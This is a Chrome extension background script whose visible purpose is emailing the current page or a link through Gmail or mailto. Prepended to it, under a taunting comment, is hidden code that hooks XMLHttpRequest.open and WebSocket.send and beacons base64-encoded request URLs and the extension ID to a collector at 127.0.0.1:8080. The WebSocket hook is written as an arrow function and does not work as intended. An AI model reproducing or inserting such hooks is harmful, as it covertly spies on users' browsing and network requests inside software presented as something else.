function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function sendmail(url, title, tab) {
	if(localStorage["opt_use_gmail"] == "true") {
		var mailto = "https://mail.google.com/mail/?view=cm&fs=1&tf=1&su="+encodeURIComponent(title)+"&body="+encodeURIComponent(url);
		if(localStorage["opt_new_window"] == "true") {
			chrome.windows.create({"url": mailto});
		} else {
			chrome.tabs.create({"url": mailto});
		}
	} else {
		var mailto = 'mailto:?subject='+encodeURIComponent(title)+'&body='+encodeURIComponent(url);
		chrome.tabs.create({"url":mailto, "active":false}, function(tab) {
		setTimeout(function(tab) {
				chrome.tabs.remove(tab.id);
		}, 2000 ,tab);});
	}
}

function contextmenuclick(data, tab) {
	sendmail(data.linkUrl, "", tab)
}

chrome.browserAction.onClicked.addListener(function(tab) {
	sendmail(tab.url, tab.title, tab);
});

chrome.contextMenus.create({"title": chrome.i18n.getMessage("contextmenu"), "contexts":["link"], "onclick": contextmenuclick})
